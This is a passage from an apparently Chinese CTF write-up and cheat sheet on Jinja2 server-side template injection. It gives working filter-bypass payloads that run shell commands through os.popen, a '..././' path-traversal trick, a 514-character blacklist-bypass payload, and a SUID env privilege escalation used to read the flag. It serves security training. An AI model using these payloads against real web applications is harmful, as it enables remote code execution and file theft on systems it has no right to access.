class="code"><pre><span class="line">&#123;&#123; ()|attr(request.form.p1)|attr(request.form.p2)|attr(request.form.p3)()|attr(request.form.p4)(X)|attr(request.form.p5)|attr(request.form.p6)|attr(request.form.p7)(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)() &#125;&#125;</span><br><span class="line">同时post传参p1=__class__&amp;p2=__base__&amp;p3=__subclasses__&amp;p4=__getitem__&amp;p5=__init__&amp;p6=__globals__&amp;p7=__getitem__</span><br></pre></td></tr></table></figure><p>或者进行16位编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()[<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fbase\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;</span>]()[X][<span class="string">&#x27;\x5f\x5finit\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="过滤-2"><a href="#过滤-2" class="headerlink" title="过滤."></a>过滤<code>.</code></h4><p>使用中括号绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[X][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]() &#125;&#125;</span><br></pre></td></tr></table></figure><p>也可以使用过滤器arrt()函数绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(X)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)() &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><p>+号拼接绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>] &#125;&#125;</span><br></pre></td></tr></table></figure><p>或使用Jinjia2的～号拼接</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=<span class="string">&#x27;__cl&#x27;</span> %&#125;&#123;% <span class="built_in">set</span> b=<span class="string">&#x27;ass__&#x27;</span> %&#125;&#123;% <span class="built_in">set</span> c=<span class="string">&#x27;__ba&#x27;</span> %&#125;&#123;% <span class="built_in">set</span> d=<span class="string">&#x27;se__&#x27;</span> %&#125;&#123;&#123; ()[a~b][c~d] &#125;&#125;</span><br></pre></td></tr></table></figure><p><code>reverse()</code>过滤器绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=<span class="string">&#x27;__ssalc__&#x27;</span>|reverse %&#125;&#123;&#123; ()[a] &#125;&#125;</span><br></pre></td></tr></table></figure><p><code>join()</code>过滤器绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=<span class="built_in">dict</span>(__cl=a,ass__=a)|join %&#125;&#123;&#123; ()[a] &#125;&#125;</span><br></pre></td></tr></table></figure><p>十六进制等编码亦可</p><h4 id="过滤config"><a href="#过滤config" class="headerlink" title="过滤config"></a>过滤config</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config &#125;&#125;</span><br><span class="line">&#123;&#123; get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="获取特殊符号"><a href="#获取特殊符号" class="headerlink" title="获取特殊符号"></a>获取特殊符号</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(lipsum|string|<span class="built_in">list</span>) %&#125;</span><br><span class="line">a[<span class="number">1</span>]为小于号,a[<span class="number">9</span>]为空格，a[<span class="number">18</span>]为下划线</span><br></pre></td></tr></table></figure><br/><h3 id="极客大挑战2025-ez-read"><a href="#极客大挑战2025-ez-read" class="headerlink" title="[极客大挑战2025]ez_read"></a>[极客大挑战2025]ez_read</h3><blockquote><p>规矩二蛊都抱怨起来：“人啊，我们老早就告诉过你。我们的名字你最好一个人知晓，不要让其他存在知道。否则我们就要为别的存在所用了。<br>现在好了吧，智慧蛊已经知道了我们的名字，事情麻烦了。”</p></blockquote><p>登录靶机，注册账号正式开始看题（前面登录并没有什么可以操作地方</p><p><code>读取故事</code>页给了一个读取文件的接口，还有几个样例文件可以读，其中的<code>3.txt</code>里面有提示<code>坚持下坚持下去去</code>，可以发现是<strong>重写绕过</strong>，在接口尝试路径穿越<code>../flag</code>会报错<code>文件不存在: flag</code>，看到把<code>../</code>进行了过滤，但是结合hint，可以重写进行路径穿越，比如<code>..././flag</code>，此时报错变成了<code>文件不存在: ../flag</code>，原因在于系统一次性配对了所有<code>../</code>进行了清楚，但是没有进行二次检查，导致重新拼接后的字符串再一次拼凑出了<code>../</code></p><br/><p>还有比较曲折的办法是用绝对路径，放这里当是熟悉Linux文件结构了，访问<code>/ect/passwd</code>**（ Linux&#x2F;Unix 系统中的用户账户信息文件）**会有如下回显</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">ctf:x:1000:1000::/opt/___web_very_strange_42___:/bin/sh</span><br></pre></td></tr></table></figure><p>文件的最后一行有一个特殊用户<code>ctf</code>，它的家目录很奇怪，可以先锁定这个目录</p><p>尝试查询<code>/proc/self/cmdline</code><strong>（Linux 系统中一个特殊的虚拟文件，它提供了当前进程的完整命令行信息）</strong>，会有以下回显</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">python3app.py</span><br></pre></td></tr></table></figure><p>结合两次回显，直接用绝对路径访问<code>/opt/___web_very_strange_42___/app.py</code>也可以读源码</p><br/><p>可以利用路径遍历去寻找源码，尝试多次使用<code>..././app.py</code>即可读取源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect, url_for, session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&quot;templates&quot;</span>, static_folder=<span class="string">&quot;static&quot;</span>)</span><br><span class="line">app.secret_key = <span class="string">&quot;key_ciallo_secret&quot;</span></span><br><span class="line"></span><br><span class="line">USERS = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">114</span>, <span class="number">514</span>):</span><br><span class="line">        <span class="keyword">return</span> payload.replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        waf = [<span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__base__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;import&quot;</span>,<span class="string">&quot;self&quot;</span>,<span class="string">&quot;session&quot;</span>,<span class="string">&quot;blueprints&quot;</span>,<span class="string">&quot;get_debug_flag&quot;</span>,<span class="string">&quot;json&quot;</span>,<span class="string">&quot;get_template_attribute&quot;</span>,<span class="string">&quot;render_template&quot;</span>,<span class="string">&quot;render_template_string&quot;</span>,<span class="string">&quot;abort&quot;</span>,<span class="string">&quot;redirect&quot;</span>,<span class="string">&quot;make_response&quot;</span>,<span class="string">&quot;Response&quot;</span>,<span class="string">&quot;stream_with_context&quot;</span>,<span class="string">&quot;flash&quot;</span>,<span class="string">&quot;escape&quot;</span>,<span class="string">&quot;Markup&quot;</span>,<span class="string">&quot;MarkupSafe&quot;</span>,<span class="string">&quot;tojson&quot;</span>,<span class="string">&quot;datetime&quot;</span>,<span class="string">&quot;cycler&quot;</span>,<span class="string">&quot;joiner&quot;</span>,<span class="string">&quot;namespace&quot;</span>,<span class="string">&quot;lipsum&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> w <span class="keyword">in</span> waf:</span><br><span class="line">            <span class="keyword">if</span> w <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;waf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = (request.form.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, error=<span class="string">&quot;用户名和密码不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> USERS:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, error=<span class="string">&quot;用户名已存在&quot;</span>)</span><br><span class="line">        USERS[username] = &#123;<span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = (request.form.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        user = USERS.get(username)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user.get(<span class="string">&quot;password&quot;</span>) != password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>, error=<span class="string">&quot;用户名或密码错误&quot;</span>)</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/profile&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    name_raw = request.args.get(<span class="string">&quot;name&quot;</span>, user)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filtered = waf(name_raw)</span><br><span class="line">        tmpl = <span class="string">f&quot;欢迎，<span class="subst">&#123;filtered&#125;</span>&quot;</span></span><br><span class="line">        rendered_snippet = render_template_string(tmpl)</span><br><span class="line">        error_msg = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        rendered_snippet = <span class="string">&quot;&quot;</span></span><br><span class="line">        error_msg = <span class="string">f&quot;渲染错误: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;profile.html&quot;</span>,</span><br><span class="line">        content=rendered_snippet,</span><br><span class="line">        name_input=name_raw,</span><br><span class="line">        user=user,</span><br><span class="line">        error_msg=error_msg,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    base_dir = os.path.join(os.path.dirname(__file__), <span class="string">&quot;story&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        entries = <span class="built_in">sorted</span>([f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(base_dir) <span class="keyword">if</span> os.path.isfile(os.path.join(base_dir, f))])</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        entries = []</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        filename = request.form.get(<span class="string">&quot;filename&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filename = request.args.get(<span class="string">&quot;filename&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    content = <span class="literal">None</span></span><br><span class="line">    error = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        sanitized = filename.replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>)//可以看到这里只进行了一次匹配替换</span><br><span class="line">        target_path = os.path.join(base_dir, sanitized)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(target_path):</span><br><span class="line">            error = <span class="string">f&quot;文件不存在: <span class="subst">&#123;sanitized&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(target_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;read.html&quot;</span>, files=entries, content=content, filename=filename, error=error, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>看出来是SSTI注入，源码的重点在</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(payload) <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">114</span>, <span class="number">514</span>):</span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    waf = [<span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__base__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;import&quot;</span>,<span class="string">&quot;self&quot;</span>,<span class="string">&quot;session&quot;</span>,<span class="string">&quot;blueprints&quot;</span>,<span class="string">&quot;get_debug_flag&quot;</span>,<span class="string">&quot;json&quot;</span>,<span class="string">&quot;get_template_attribute&quot;</span>,<span class="string">&quot;render_template&quot;</span>,<span class="string">&quot;render_template_string&quot;</span>,<span class="string">&quot;abort&quot;</span>,<span class="string">&quot;redirect&quot;</span>,<span class="string">&quot;make_response&quot;</span>,<span class="string">&quot;Response&quot;</span>,<span class="string">&quot;stream_with_context&quot;</span>,<span class="string">&quot;flash&quot;</span>,<span class="string">&quot;escape&quot;</span>,<span class="string">&quot;Markup&quot;</span>,<span class="string">&quot;MarkupSafe&quot;</span>,<span class="string">&quot;tojson&quot;</span>,<span class="string">&quot;datetime&quot;</span>,<span class="string">&quot;cycler&quot;</span>,<span class="string">&quot;joiner&quot;</span>,<span class="string">&quot;namespace&quot;</span>,<span class="string">&quot;lipsum&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> waf:</span><br><span class="line">        <span class="keyword">if</span> w <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;waf&quot;</span>)</span><br></pre></td></tr></table></figure><p>当<code>name</code>传参的字符串长度不为114或514时，它会删除内容中所有的左括号，当长度等于114或514时，则会进行waf黑名单过滤，尝试绕过左括号是不可能的，这里只能进行黑名单绕过</p><p>接下来研读<a href="https://wwwmarin.xyz/">@marin</a>师傅搓的payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(a,a,<span class="built_in">dict</span>(get=a,item=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> o=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(request.values.a) %&#125;</span><br><span class="line">&#123;&#123; (url_for|attr(glo))|attr(getitem)(o)|attr(popen)(cmd)|attr(read)() &#125;&#125;<span class="number">11111111111111111111111111111111111111111111111111111111111111111111111</span>  //字符长度为<span class="number">514</span></span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join %&#125;</span><br></pre></td></tr></table></figure><p>这里创建了一个变量<code>p</code>，<code>dict(po=a,p=a)</code>创建了一个字典，然后利用<code>|join</code>过滤器将键名拼接返回字符串，最后<code>p=pop</code></p><br/><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>) %&#125;</span><br></pre></td></tr></table></figure><p>在 Jinja2 中使用 <code>select</code> 过滤器获得生成器对象，输出类似于<code>&lt;generator object select_or_reject at 0x7f8334407e20&gt;</code>，可以利用这个构建<code>&quot;_&quot;</code></p><p>当有效输入为<code>&#123;% set a=(''|select|string|list) %&#125;&#123;% print a %&#125;</code>时，页面的有效回显是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>]</span><br></pre></td></tr></table></figure><p>利用前面构建的<code>pop</code>函数提取序号为24的字符就完成了下划线的构建</p><br/><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(a,a,<span class="built_in">dict</span>(get=a,item=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> o=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br></pre></td></tr></table></figure><p>此处构建了<code>__init__</code>、<code>__globals__</code>、<code>__getitem__</code>、<code>popen</code>、<code>read</code>和<code>os</code>，原理同第一条</p><br/><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> cmd=(request.values.a) %&#125;</span><br></pre></td></tr></table></figure><p>创建变量<code>cmd</code>，它的值等于GET传入的参数<code>a</code>的值</p><br/><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; (url_for|attr(glo))|attr(getitem)(o)|attr(popen)(cmd)|attr(read)() &#125;&#125;</span><br></pre></td></tr></table></figure><p>此处已等价于<code>&#123;&#123; (url_for|attr('__globals__'))|attr('__getitem__')(os)|attr('popen')(cmd)|attr('read')() &#125;&#125;</code></p><p>也相当于<code>&#123;&#123; url_for['__globals__']['__getitem__']('os')['popen'](cmd)['read']() &#125;&#125;</code></p><br/><p>此时就可以进行命令执行了，传入payload和<code>a=ls /</code>，可以看到<code>flag</code>文件，尝试提取发现无回显，可能是需要<strong>提权</strong>，做题时可以用<code>&#123;&#123; cycler.__init__.__globals__['os'].environ &#125;&#125;</code>查看全局变量，这里有一个提示<code>&#39;HINT&#39;: &#39;用我提个权吧&#39;</code>，接下来查找提权的文件，传入<code>a=find / -user root -perm -4000 -print 2&gt;/dev/null</code>，回显</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/usr/bin/su </span><br><span class="line">/usr/bin/gpasswd </span><br><span class="line">/usr/bin/chfn </span><br><span class="line">/usr/bin/chsh </span><br><span class="line">/usr/bin/umount </span><br><span class="line">/usr/bin/newgrp </span><br><span class="line">/usr/bin/passwd </span><br><span class="line">/usr/bin/mount </span><br><span class="line">/usr/local/bin/env</span><br></pre></td></tr></table></figure><p>结合在环境变量读到的hint，利用<code>/usr/local/bin/env</code>进行提权，传入<code>a=/usr/local/bin/env cat /flag</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;D0nt_m@ke_w1sdom_awar3_of_Rules_019aa4645e167e239a74402217bba8d1&#125;</span><br></pre></td></tr></table></figure><br/><h3 id="Aurora-CTF-2025-戈达尔的剧本工厂"><a href="#Aurora-CTF-2025-戈达尔的剧本工厂" class="headerlink" title="[Aurora CTF 2025]戈达尔的剧本工厂"></a>[Aurora CTF 